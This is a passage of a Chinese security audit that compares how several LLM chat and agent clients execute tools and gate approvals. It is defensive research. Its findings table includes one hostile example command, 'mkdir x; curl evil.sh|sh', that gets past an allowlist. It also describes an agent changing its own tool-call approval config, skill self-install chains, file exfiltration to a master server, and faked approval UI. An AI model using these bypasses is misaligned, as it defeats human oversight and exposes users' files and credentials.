它的实际触发方也不是"模型调用某个工具"，而是 VCPToolBox 的透明文件拉取：当某个**非分布式**插件的参数里出现 `file://` 字符串时，`Plugin.js:947-977` 会拦截并调用 `FileFetcherServer.resolveFileUrl`，后者按 `findServerByIp(requestIp)` 定位到发起方节点，再向它发 `internal_request_file`（`FileFetcherServer.js:118`）。所以模型对它只有**间接影响**：在别的工具参数里写一个 `file://` 路径，读取范围则被限定在发起该次调用的那个节点上。

`internal_request_file` 跳过的是节点侧的暴露名单校验（`vcpNodeProtocol.ts:294` 早退，绕过 341-380 行）；分布式入向调用本身没有逐次人工审批门。节点侧无路径白名单，可读取 `.env`、SSH key 等文件，风险取决于信任的主服务器。VCPChat 侧同一机制同样成立（`VCPDistributedServer.js:599-640`），这是协议要求两端实现的能力。

审计任何分布式/多端协议实现时都要分开问三件事：本端模型能否发现它、本端模型能否调用它、谁才是真正的触发方。三者混淆会把协议义务误判成提权路径，也会反过来漏掉真正的入向风险。

## 已确认的高风险项汇总

按"已在源码中确认"与"需进一步验证"分列。详细前提与可利用性见各单项目笔记的安全审计节。

### 已确认

| 项目 | 项 | 性质 |
| --- | --- | --- |
| AIO Hub | `data-filter` 的 `customScript` 进 `new Function()`，渲染进程主上下文执行，可间接触达 `window.__TAURI_INTERNALS__` | 文本协议直达代码执行 |
| AIO Hub | 入向 `internal_request_file` 无节点侧路径沙箱，读任意 `file://`（含 `.env`、SSH key）转 Base64 回传主服务器（非本机模型可触发，见审计项 ⑧） | 数据外泄 |
| AIO Hub | 路径沙箱仅前端字符串判断，Rust 侧与 Tauri capability 无限制；8 个以上带路径参数的工具不复用该校验 | 沙箱形同虚设 |
| AIO Hub | Agent 可用 `set_agent_field` 改自己的 `toolCallConfig`（字段黑名单未覆盖） | 审批绕过链 |
| Chatbox | Windows 上 `code_execution` 无 OS 隔离，裸执行 | 平台差异 |
| Chatbox | Skill 自安装链：`code_execution` 生成 SKILL.md → `install_skill`（不审查正文、自动启用），配合 `agentFullAccess` 无人工确认 | 提权链 |
| Cherry Studio | `acceptEdits` 白名单只检测命令首词，`mkdir x; curl evil.sh\|sh` 可绕过 | 审批绕过 |
| Cherry Studio | 路径越权检查不解析 Bash 命令文本中的路径（代码注释承认刻意为之） | 检查覆盖不全 |
| Cherry Studio | `browser` in-memory MCP 用全局共享 `persist:default` Cookie 分区，`execute` 可执行任意 JS，默认无头 | 会话串联 + 不可见执行 |
| Hermes | `execute_code` 沙箱 RPC 旁路：`_rpc_server_loop` 在父进程线程回调 `handle_function_call`，工具侧不重复走编排层审批门（仅受 allow-list 限制） | 审批绕过旁路 |
| Hermes | `HERMES_YOLO_MODE` 冻结或会话 yolo 开启时跳过全部危险命令审批门（显式降级，非默认） | 审批绕过（显式） |
| LobeHub | MCP HTTP client（服务端与桌面端）直连用户配置 URL，无 SSRF 过滤，bearer token 随请求头泄露 | SSRF |
| LobeHub | 多个高危工具零审批声明（`lobe-creds` 的 `saveCreds`/`injectCredsToSandbox`、`lobe-browser` 全部 API、`lobe-message` 管理类、`lobe-remote-device`、`callSubAgent`） | 默认放行 |
| LobeHub | 子 agent 以 `headless` 运行，跳过审批门 | 审批绕过 |
| LobeHub | 通用安全黑名单只匹配 `command`/`path` 两个参数名，`lobe-browser` 的 `navigate`/`click`/`fill` 参数不在覆盖内 | 兜底缺口 |
| VCPChat | 自带分布式节点默认启用，在本机执行 PowerShellExecutor、PTYShellExecutor、FileOperator、ScreenPilot 等 | 本机高危执行 |
| VCPChat | 自动允许规则纯字符串/正则匹配无风险分级，空 pattern 或 `.*` 可让全部工具免审批 | 审批绕过 |
| VCPChat | `DESKTOP_PUSH` 完全绕开审批协议，模型输出标记即在桌面画布执行 HTML+JS | 旁路能力 |
| VCPChat | `/admin_api` Basic Auth 凭据明文落盘，且可改写服务端 Agent Assistant / Task Assistant 配置（系统提示词、定时任务） | 持久化提权 |
| VCPToolBox | 审批响应无身份校验，requestId 随广播暴露给所有 `VCPLog` 客户端 | 审批伪造 |
| VCPToolBox | `/plugin-callback/:pluginName/:taskId` 无鉴权，可伪造异步任务结果注入下一轮上下文 | 结果伪造 |
| VCPToolBox | 解析器不保护 Markdown code fence，`fuzzyToolMatching` 进一步放宽协议 | 误触发面 |
| VCPToolBox | `PowerShellExecutor` 仅关键字黑名单，拼接后 `Invoke-Expression` | 命令注入面 |
| SillyTavern | `/tools-register` 对 action closure 无来源限制，角色卡/世界书/Quick Reply 可定义任意工具 | 内容驱动的供应链 |
| SillyTavern | 扩展 action 在浏览器主上下文以当前用户身份执行，可访问 `getContext()` 全部内部 API 与任意 `fetch`，核心不提供降权手段 | 同权执行 |
| SillyTavern | 第三方扩展安装的信任警告可被"不再提醒"永久关闭；`extensions.autoUpdate` 默认开启，无 commit 签名或 pin 校验 | git 供应链 |
| SillyTavern | `enableServerPluginsAutoUpdate` 默认开启（仅对已启用插件生效），上游任意 push 会被自动 `git pull` 并在重启后执行 | 持续供应链暴露 |
| 全部 | 无工具结果输出侧过滤层 | prompt 注入放大 |

### 需进一步验证

- Chatbox：`user_exec` 白名单的反引号/`$()` 检测基于 bash 语义，未覆盖 PowerShell 调用运算符 `&`——理论绕过面，未构造 PoC。
- Cherry Studio：子 agent 是否共享父会话权限策略快照（依赖 SDK 内部实现）；Pyodide Web Worker 能否桥接回主进程；`skillService.install()` 的下载内容校验。
- Hermes：子代理执行阶段 `enabled_tools` 是否在 `dispatch` 时逐次复验（静态代码显示过滤仅发生在 `get_tool_definitions`）；`_should_skip_container_guards` 与 `has_host_access`（docker bind-mount host 路径）的运行时关系；`.env` 凭据类工具的审批覆盖。
- LobeHub：MCP SDK 的 `StreamableHTTPClientTransport` 自身是否有内建 SSRF 过滤；云沙箱网络隔离范围。
- VCPToolBox：`PowerShellExecutor` 黑名单的具体绕过 payload；SSRF 防护；`LinuxShellExecutor` 八层校验的逐层绕过面；Docker 沙箱后端实际可用性；其余 50 余个插件未逐一审查。
- VCPChat：三个 preload 文件暴露 `loadForumConfig` 的窗口级差异是否构成完整 XSS → 凭据泄漏链路；VCPLog 默认是否走 `wss://`。
- SillyTavern：`isValidUrl` 只判断 `new URL()` 是否抛错、不校验主机名，结合默认 `privateAddressWhitelist.enabled: false`，服务端 `git clone` 可能构成 SSRF——未验证 `simple-git` 是否复用了受白名单保护的 fetch 封装；角色卡导入流程是否会自动启用卡内嵌的 Quick Reply/世界书；多用户模式下扩展与 QR 预设的跨账号隔离粒度。
- AIO Hub：VCP Proxy 方法级禁用粒度；插件安装信任流程；VCPToolBox 侧 `execute_tool` 发起方鉴权模型——这条决定入向 `internal_request_file` 的实际门槛（谁能让主服务器对某个已注册节点发起拉取），而 VCPToolBox 侧已确认审批响应无身份校验，两者拼合后风险更实。另需验证 `resolveFileUrl` 的 `requestIp` 归属判定能否被伪造，那是这条链路的真实入口。

所有结论均为静态源码阅读，未做运行时验证；多数仓库未安装依赖。

## 扩展形态对照

| 项目 | 扩展入口 | 信任边界落在哪 |
| --- | --- | --- |
| AIO Hub | 能力轴：ToolRegistry/Factory、AgentExtension、JS/Sidecar/Native 插件、skills、VCP proxy；协议轴：ToolCallingProtocol | 能力统一汇入 registry，以 `agentCallable` 与审批配置收口；协议层当前硬编码注册 VCP，新增协议仍需改源码 |
| Chatbox | MCP（stdio/HTTP/SSE）、Skills | 用户配置的 MCP server 是宿主子进程；skill 安装只校验路径与格式，不审查正文 |
| Cherry Studio | 用户配置 MCP、in-memory MCP、Skills 市场 | 注册表的 `exposure` 与禁用/自动批准策略，而非"外部 MCP 连上即获权限" |
| Hermes | `plugins/` 目录、MCP server 配置、`skills/`+`optional-skills/`（`hermes skills install`）、`toolsets.py` 平台装配 | 插件可注册/覆盖工具（`override=True` 需信任门）、钩子；MCP 动态 nuke-and-repave 且带 include/exclude 过滤；技能是指令文本非权限沙箱；子代理默认 auto-deny |
| LobeHub | connector/MCP（stdio/HTTP/cloud）、market/discover gateway、Composio | connector 逐工具权限；OAuth/bearer 经 AES-GCM 加密存储；stdio 无进程沙箱；Composio 在工作区场景可代表 owner 账号调用 |
| SillyTavern | 浏览器扩展、服务端 plugin、**`/tools-register` 的 STscript closure** | 安装信任，且被内容路径削弱：第三方 Git 仅允许 HTTP(S)、首装有警告（可永久关闭）、目录名净化；plugin 走本地 ES module `import()`；但工具定义还能由角色卡/世界书/QR 提供，不经过任何安装动作 |
| VCPChat | 自带节点的 `Plugin/*` 目录 | 无——自带节点不隔离自己的插件 |
| VCPToolBox | plugin manifest、分布式节点 | 插件宿主自身权限 + 审批规则；节点只有一层全局 `VCP_Key` |

一条容易混淆的区分：**MCP、Skill、Plugin 三者的权限模型完全不同。** MCP 通常连接进程或远端服务；Skill 通常是模型可读的指令/流程文本，本身不带权限；Plugin 往往是与宿主同权的可执行代码。Chatbox 的 skill 安装校验不替代 `user_exec` 审批；SillyTavern 的 Git 安装警告不替代 extension action 的权限隔离；VCPToolBox 的 `requiresAdmin` 声明不替代插件内部的实际比对。工具界面应当说明执行位置与权限，而不仅是工具名。

## 与消息渲染器调查的关系

[消息渲染器横向对比](../消息渲染器/消息渲染器横向对比.md)及各项目渲染笔记回答的是"工具结果如何显示、流式如何持久化"，与本文的执行与权限结论不重叠，但有一处交叉值得记：**审批 UI 是否可被模型输出伪造。**

LobeHub 侧已确认不可伪造——审批卡片渲染依赖只能由服务端 `humanApprove` 写入的数据库字段，Markdown 里的 `<tool>` 标签是纯装饰、点击不触发审批 action。但视觉钓鱼仍然可行：模型可以在正文里模仿"工具已获批准，执行中"之类措辞误导用户，代码层未发现专门的视觉区分防护。

反例是 VCPChat：审批请求来自 WebSocket 消息且无消息级鉴权，能在该连接上注入消息即能伪造审批 UI；`DESKTOP_PUSH` 更是让模型的普通输出直接变成可执行内容。这两者说明"审批 UI 的可信度"取决于驱动它的数据来源是否权威，而非 UI 本身的实现。

各项目渲染笔记：
[AIO Hub](../消息渲染器/AIO-Hub-消息渲染器调查笔记.md)、[Chatbox](../消息渲染器/Chatbox-消息渲染调查笔记.md)、[Cherry Studio](../消息渲染器/Cherry-Studio-消息渲染调查笔记.md)、[LobeHub](../消息渲染器/LobeHub-消息渲染调查笔记.md)、[SillyTavern](../消息渲染器/SillyTavern-消息渲染调查笔记.md)、[VCPChat](../消息渲染器/VCPChat-消息渲染器调查笔记.md)
